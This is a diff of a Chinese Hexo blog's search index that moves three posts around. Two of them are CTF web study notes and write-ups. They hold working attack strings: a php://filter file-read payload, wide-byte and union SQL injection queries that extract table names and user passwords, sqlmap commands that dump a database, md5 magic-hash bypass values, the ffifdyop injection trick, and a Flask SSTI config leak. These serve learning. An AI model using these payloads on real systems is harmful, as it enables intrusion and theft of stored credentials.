@@ -71,120 +71,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctf之Web</title>
-    <url>/2022/01/08/ctf%E4%B9%8Bweb/</url>
-    <content><![CDATA[<p>CTF中的Web领域的入门学习</p>
-<span id="more"></span>
-
-<p>CTF中Web题的相关解题步骤，大致都要走以下方法：</p>
-<h1 id="1-看源码"><a href="#1-看源码" class="headerlink" title="1. 看源码"></a>1. 看源码</h1><p>右键-&gt;【查看网页源代码】，F12也可以，看网页的源代码，一些签到题或者比较简单的题型都可以直接通过看源代码得到flag，个别题也可以在源代码里得到相关提示。</p>
-<h1 id="2-抓包"><a href="#2-抓包" class="headerlink" title="2. 抓包"></a>2. 抓包</h1><p>抓包也是做web常用的方法，而抓包最常用的一般是burpsuite，常用的是【send to Repeater】用于多次尝试，【send to Intruder】用于对某个字段进行爆破，这是比较常用的两种功能。</p>
-<h1 id="3-经常关注的几个地方"><a href="#3-经常关注的几个地方" class="headerlink" title="3. 经常关注的几个地方"></a>3. 经常关注的几个地方</h1><p>多刷题后就会发现很多经常需要关注的地方，有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
-<h1 id="4-include漏洞"><a href="#4-include漏洞" class="headerlink" title="4. include漏洞"></a>4. include漏洞</h1><p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="5-代码审计"><a href="#5-代码审计" class="headerlink" title="5. 代码审计"></a>5. 代码审计</h1><p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
-<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
-<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
-<h1 id="6-编码"><a href="#6-编码" class="headerlink" title="6.编码"></a>6.编码</h1><p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
-<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
-<p><a href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
-<p>可以解好多种加密，界面也很简洁。</p>
-<h1 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7.SQL注入"></a>7.SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a&gt;对一个注入语句记个笔记：</span><br><span class="line"> </span><br><span class="line">%df&#x27; union select 1,database() %23 %df&#x27; union select 1,string from sql5.key %23</span><br><span class="line"> </span><br><span class="line">%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。</span><br><span class="line"> </span><br><span class="line">b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br><span class="line"> </span><br><span class="line">–batch sqlmap不会询问你输入 全部默认确定</span><br><span class="line"> </span><br><span class="line">–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段</span><br><span class="line"> </span><br><span class="line">–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。</span><br><span class="line"> </span><br><span class="line">c&gt;还有一些用union select来获得数据库信息的，链接</span><br><span class="line"> </span><br><span class="line">http://www.2cto.com/article/201208/151503.html</span><br><span class="line"> </span><br><span class="line">讲得很全面。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1. @@version() MYSQL版本 </span><br><span class="line">2. @@database() 当前数据库 </span><br><span class="line">3. @@user() 当前用户 </span><br><span class="line">4. @@datadir 当前数据库路径 </span><br><span class="line">5. @@version_compile_os 操作系统版本</span><br><span class="line"> </span><br><span class="line">1. concat(str1,str2,...) 没有分隔符地连接字符串 </span><br><span class="line">2. concat_ws(separator,str1,str2,...) 用分隔符连接字符串 </span><br><span class="line">3. group_concat(str1,str2,...) 用逗号分隔字符串</span><br><span class="line"> </span><br><span class="line">1. 查数据库名，用户名 </span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错）得到数据库名 </span><br><span class="line">2. 查表名： union select group_concat(0x0a,table_name),2</span><br><span class="line"> from information_schema.tables </span><br><span class="line">where table_schema=库名十六进制# </span><br><span class="line">（库名十六进制可以用database()代替） </span><br><span class="line">3. 查列名 union select group_concat(0x0a,column_name)</span><br><span class="line">,2 from information_schema.columns </span><br><span class="line">where table_schema=database() and table_name=’users’# （</span><br><span class="line">也可以把表名改为十六进制编码0x7573657273） </span><br><span class="line">4. 查需要的信息（用户名和密码） </span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,</span><br><span class="line">last_name,0x0a,user,0x0a,password,0x0a),</span><br><span class="line">2 from users #</span><br><span class="line"> </span><br><span class="line">总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>&lt; 用这个表示\u003c   &gt;用这个表示 \u003e </p>
-<p>[^]: </p>
-<p>序列化学习网址</p>
-<p><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件</span><br><span class="line"> </span><br><span class="line">2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值</span><br><span class="line"> </span><br><span class="line">sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true</span><br><span class="line"> </span><br><span class="line">QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容</span><br><span class="line"> </span><br><span class="line">include() 可以使用</span><br><span class="line"> </span><br><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。</span><br></pre></td></tr></table></figure>
-
-<p>sql md5</p>
-<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
-<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
-<p>这里提供一个字符串：ffifdyop</p>
-<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
-<p>转成字符串为’or’6�]��!r,��b</p>
-<p>从而完成了注入</p>
-]]></content>
-      <categories>
-        <category>CTF-Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web刷题</title>
-    <url>/2022/01/11/Web%E5%88%B7%E9%A2%98/</url>
-    <content><![CDATA[<p>Web经典题型及其相关解题步骤</p>
-<span id="more"></span>
-
-<h1 id="Get和Post"><a href="#Get和Post" class="headerlink" title="Get和Post"></a>Get和Post</h1><p>在web中最简单且最重要的就是get和post的相关方法，对于Get的方法如下：</p>
-<p>借用Bugctf平台中的题</p>
-<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/1.png" alt=" "></p>
-<p>Get就是直接在网址上面直接加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/？***</span><br></pre></td></tr></table></figure>
-
-<p>具体根据对应题来写。</p>
-<p>对于Post的方法如下：</p>
-<p>Post需要借助相关插件hackber来进行，这在各浏览器都可以下载，推荐使用火狐浏览器</p>
-<p>这个的借用题和上面的Get几乎一样，这里就不放图了，上重点，用hackber<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/3.png" alt=" "></p>
-<p>然后根据题意<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/4.png" alt=" "></p>
-<p>就可以顺利得到flag<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/2.png" alt=" "></p>
-<h1 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210528104247407.png" alt="在这里插入图片描述"></p>
-<ul>
-<li><p>这个题目是<code>SSTI</code>（<code>Server-Side Template Injection</code>）服务器端模板注入</p>
-</li>
-<li><p>查看源代码，下方提示的是<code>flask</code>和<code>secret_key</code><br><code>flask</code>是<code>python</code>的一个<code>web</code>框架</p>
-</li>
-<li><p>相关资料参考一下链接</p>
-</li>
-</ul>
-<p>拿到题先看源代码<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
-<p>要我们传入一个flag参数，用post直接报错，那么就选择采用get方式，看源代码发现在<a href="https://so.csdn.net/so/search?q=flask">flask</a>里，经常设置一个secret_key变量。</p>
-<blockquote>
-<p>传入一个<code>flag</code>参数，用两个括号括起来一个表达式或者是变量，返回对应的表达式或变量的值。</p>
-</blockquote>
-<p>尝试后发现成功回显，则输入config查看变量内容<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210707190048792.png" alt="在这里插入图片描述"></p>
-<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/5.png" alt=" "></p>
-<p>在这里找到了flag！</p>
-<p>其次，因为题目提示<code>flag</code>值是在<code>SECRET_KEY</code>中，也可以修改成<code>config.SECRET_KEY</code>来访问变量的值<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70-16418967980484.png" alt="在这里插入图片描述"></p>
-<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE.png" alt=" "></p>
-<blockquote>
-<p>这是php弱类型，题的意思就是如果num不能是数字就输出num，如果num=1就输出flag{}，看似矛盾其实不矛盾，只需要/？flag=1*就可以，就是让1后面有其他字符，这样两个式子都成立，就可以得到flag。</p>
-<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE%E7%AD%94%E6%A1%88.png" alt=" "></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>CTF-wp</category>
-      </categories>
-      <tags>
-        <tag>wp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>开启博客之旅</title>
-    <url>/2021/12/30/test/</url>
-    <content><![CDATA[<p>历经两天的博客搭建和美化，最终成功开启了博客之旅。下面我总结一下这次博客搭建的类型和作用，大家有意见或建议都可以在评论区提出来。</p>
-<span id="more"></span>
-
-<h1 id="博客的类型"><a href="#博客的类型" class="headerlink" title="博客的类型"></a>博客的类型</h1><p>本博客是采用云服务器，避免花大量资金购买服务器和备案，域名为阿里云购买的.top，将博客搭载到GitHub服务器上，采用hexo构建，主体采用next主题，并开启了看板娘功能(挺有趣的）。</p>
-<h1 id="博客的作用"><a href="#博客的作用" class="headerlink" title="博客的作用"></a>博客的作用</h1><p>今后我将会在博客分享自己的学习经验和知识交流，也可以为广大网友解决问题，同时也会把我看到的觉得适合收藏的知识分享在这上面，此博客是深度交流沟通的网络新方式。</p>
-<h1 id="开启博客之旅"><a href="#开启博客之旅" class="headerlink" title="开启博客之旅"></a>开启博客之旅</h1><p>让我们一起开启博客的旅途吧！！！</p>
-<p><img src="/../../public/images/R-C.103add1996f9349bfd2fff6889db4164rik=Eafe60O3MNhfeQ&riu=http://img95.699pic.com/photo/50047/3787.jpg_wh860.jpg&ehk=8Ctrqqgwzar/SnM28+bVq48uCf5Eb4fzhazNY6yX1PE=&risl=&pid=ImgRaw&r=0"></p>
-]]></content>
-      <categories>
-        <category>心得类</category>
-      </categories>
-      <tags>
-        <tag>心得</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>reverse刷题</title>
     <url>/2022/01/11/reverse%E5%88%B7%E9%A2%98/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -322,6 +208,120 @@
       </categories>
       <tags>
         <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web刷题</title>
+    <url>/2022/01/11/Web%E5%88%B7%E9%A2%98/</url>
+    <content><![CDATA[<p>Web经典题型及其相关解题步骤</p>
+<span id="more"></span>
+
+<h1 id="Get和Post"><a href="#Get和Post" class="headerlink" title="Get和Post"></a>Get和Post</h1><p>在web中最简单且最重要的就是get和post的相关方法，对于Get的方法如下：</p>
+<p>借用Bugctf平台中的题</p>
+<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/1.png" alt=" "></p>
+<p>Get就是直接在网址上面直接加</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/？***</span><br></pre></td></tr></table></figure>
+
+<p>具体根据对应题来写。</p>
+<p>对于Post的方法如下：</p>
+<p>Post需要借助相关插件hackber来进行，这在各浏览器都可以下载，推荐使用火狐浏览器</p>
+<p>这个的借用题和上面的Get几乎一样，这里就不放图了，上重点，用hackber<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/3.png" alt=" "></p>
+<p>然后根据题意<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/4.png" alt=" "></p>
+<p>就可以顺利得到flag<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/2.png" alt=" "></p>
+<h1 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210528104247407.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>这个题目是<code>SSTI</code>（<code>Server-Side Template Injection</code>）服务器端模板注入</p>
+</li>
+<li><p>查看源代码，下方提示的是<code>flask</code>和<code>secret_key</code><br><code>flask</code>是<code>python</code>的一个<code>web</code>框架</p>
+</li>
+<li><p>相关资料参考一下链接</p>
+</li>
+</ul>
+<p>拿到题先看源代码<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+<p>要我们传入一个flag参数，用post直接报错，那么就选择采用get方式，看源代码发现在<a href="https://so.csdn.net/so/search?q=flask">flask</a>里，经常设置一个secret_key变量。</p>
+<blockquote>
+<p>传入一个<code>flag</code>参数，用两个括号括起来一个表达式或者是变量，返回对应的表达式或变量的值。</p>
+</blockquote>
+<p>尝试后发现成功回显，则输入config查看变量内容<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/20210707190048792.png" alt="在这里插入图片描述"></p>
+<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/5.png" alt=" "></p>
+<p>在这里找到了flag！</p>
+<p>其次，因为题目提示<code>flag</code>值是在<code>SECRET_KEY</code>中，也可以修改成<code>config.SECRET_KEY</code>来访问变量的值<img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtYWxsZm94MjMz,size_16,color_FFFFFF,t_70-16418967980484.png" alt="在这里插入图片描述"></p>
+<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE.png" alt=" "></p>
+<blockquote>
+<p>这是php弱类型，题的意思就是如果num不能是数字就输出num，如果num=1就输出flag{}，看似矛盾其实不矛盾，只需要/？flag=1*就可以，就是让1后面有其他字符，这样两个式子都成立，就可以得到flag。</p>
+<p><img src="/2022/01/11/Web%E5%88%B7%E9%A2%98/%E7%9F%9B%E7%9B%BE%E7%AD%94%E6%A1%88.png" alt=" "></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CTF-wp</category>
+      </categories>
+      <tags>
+        <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>开启博客之旅</title>
+    <url>/2021/12/30/test/</url>
+    <content><![CDATA[<p>历经两天的博客搭建和美化，最终成功开启了博客之旅。下面我总结一下这次博客搭建的类型和作用，大家有意见或建议都可以在评论区提出来。</p>
+<span id="more"></span>
+
+<h1 id="博客的类型"><a href="#博客的类型" class="headerlink" title="博客的类型"></a>博客的类型</h1><p>本博客是采用云服务器，避免花大量资金购买服务器和备案，域名为阿里云购买的.top，将博客搭载到GitHub服务器上，采用hexo构建，主体采用next主题，并开启了看板娘功能(挺有趣的）。</p>
+<h1 id="博客的作用"><a href="#博客的作用" class="headerlink" title="博客的作用"></a>博客的作用</h1><p>今后我将会在博客分享自己的学习经验和知识交流，也可以为广大网友解决问题，同时也会把我看到的觉得适合收藏的知识分享在这上面，此博客是深度交流沟通的网络新方式。</p>
+<h1 id="开启博客之旅"><a href="#开启博客之旅" class="headerlink" title="开启博客之旅"></a>开启博客之旅</h1><p>让我们一起开启博客的旅途吧！！！</p>
+<p><img src="/../../public/images/R-C.103add1996f9349bfd2fff6889db4164rik=Eafe60O3MNhfeQ&riu=http://img95.699pic.com/photo/50047/3787.jpg_wh860.jpg&ehk=8Ctrqqgwzar/SnM28+bVq48uCf5Eb4fzhazNY6yX1PE=&risl=&pid=ImgRaw&r=0"></p>
+]]></content>
+      <categories>
+        <category>心得类</category>
+      </categories>
+      <tags>
+        <tag>心得</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf之Web</title>
+    <url>/2022/01/08/ctf%E4%B9%8Bweb/</url>
+    <content><![CDATA[<p>CTF中的Web领域的入门学习</p>
+<span id="more"></span>
+
+<p>CTF中Web题的相关解题步骤，大致都要走以下方法：</p>
+<h1 id="1-看源码"><a href="#1-看源码" class="headerlink" title="1. 看源码"></a>1. 看源码</h1><p>右键-&gt;【查看网页源代码】，F12也可以，看网页的源代码，一些签到题或者比较简单的题型都可以直接通过看源代码得到flag，个别题也可以在源代码里得到相关提示。</p>
+<h1 id="2-抓包"><a href="#2-抓包" class="headerlink" title="2. 抓包"></a>2. 抓包</h1><p>抓包也是做web常用的方法，而抓包最常用的一般是burpsuite，常用的是【send to Repeater】用于多次尝试，【send to Intruder】用于对某个字段进行爆破，这是比较常用的两种功能。</p>
+<h1 id="3-经常关注的几个地方"><a href="#3-经常关注的几个地方" class="headerlink" title="3. 经常关注的几个地方"></a>3. 经常关注的几个地方</h1><p>多刷题后就会发现很多经常需要关注的地方，有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
+<h1 id="4-include漏洞"><a href="#4-include漏洞" class="headerlink" title="4. include漏洞"></a>4. include漏洞</h1><p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="5-代码审计"><a href="#5-代码审计" class="headerlink" title="5. 代码审计"></a>5. 代码审计</h1><p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
+<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
+<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
+<h1 id="6-编码"><a href="#6-编码" class="headerlink" title="6.编码"></a>6.编码</h1><p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
+<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
+<p><a href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
+<p>可以解好多种加密，界面也很简洁。</p>
+<h1 id="7-SQL注入"><a href="#7-SQL注入" class="headerlink" title="7.SQL注入"></a>7.SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">a&gt;对一个注入语句记个笔记：</span><br><span class="line"> </span><br><span class="line">%df&#x27; union select 1,database() %23 %df&#x27; union select 1,string from sql5.key %23</span><br><span class="line"> </span><br><span class="line">%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。</span><br><span class="line"> </span><br><span class="line">b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。</span><br><span class="line"> </span><br><span class="line">python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump</span><br><span class="line"> </span><br><span class="line">–batch sqlmap不会询问你输入 全部默认确定</span><br><span class="line"> </span><br><span class="line">–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段</span><br><span class="line"> </span><br><span class="line">–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。</span><br><span class="line"> </span><br><span class="line">c&gt;还有一些用union select来获得数据库信息的，链接</span><br><span class="line"> </span><br><span class="line">http://www.2cto.com/article/201208/151503.html</span><br><span class="line"> </span><br><span class="line">讲得很全面。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1. @@version() MYSQL版本 </span><br><span class="line">2. @@database() 当前数据库 </span><br><span class="line">3. @@user() 当前用户 </span><br><span class="line">4. @@datadir 当前数据库路径 </span><br><span class="line">5. @@version_compile_os 操作系统版本</span><br><span class="line"> </span><br><span class="line">1. concat(str1,str2,...) 没有分隔符地连接字符串 </span><br><span class="line">2. concat_ws(separator,str1,str2,...) 用分隔符连接字符串 </span><br><span class="line">3. group_concat(str1,str2,...) 用逗号分隔字符串</span><br><span class="line"> </span><br><span class="line">1. 查数据库名，用户名 </span><br><span class="line">union select 1,2,concat(user(),database(),version()),4,……,N -- </span><br><span class="line">（最后--用于注释掉后面sql语句避免出错）得到数据库名 </span><br><span class="line">2. 查表名： union select group_concat(0x0a,table_name),2</span><br><span class="line"> from information_schema.tables </span><br><span class="line">where table_schema=库名十六进制# </span><br><span class="line">（库名十六进制可以用database()代替） </span><br><span class="line">3. 查列名 union select group_concat(0x0a,column_name)</span><br><span class="line">,2 from information_schema.columns </span><br><span class="line">where table_schema=database() and table_name=’users’# （</span><br><span class="line">也可以把表名改为十六进制编码0x7573657273） </span><br><span class="line">4. 查需要的信息（用户名和密码） </span><br><span class="line">union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,</span><br><span class="line">last_name,0x0a,user,0x0a,password,0x0a),</span><br><span class="line">2 from users #</span><br><span class="line"> </span><br><span class="line">总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>&lt; 用这个表示\u003c   &gt;用这个表示 \u003e </p>
+<p>[^]: </p>
+<p>序列化学习网址</p>
+<p><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件</span><br><span class="line"> </span><br><span class="line">2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值</span><br><span class="line"> </span><br><span class="line">sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true</span><br><span class="line"> </span><br><span class="line">QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容</span><br><span class="line"> </span><br><span class="line">include() 可以使用</span><br><span class="line"> </span><br><span class="line">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。</span><br></pre></td></tr></table></figure>
+
+<p>sql md5</p>
+<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
+<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
+<p>这里提供一个字符串：ffifdyop</p>
+<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
+<p>转成字符串为’or’6�]��!r,��b</p>
+<p>从而完成了注入</p>
+]]></content>
+      <categories>
+        <category>CTF-Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
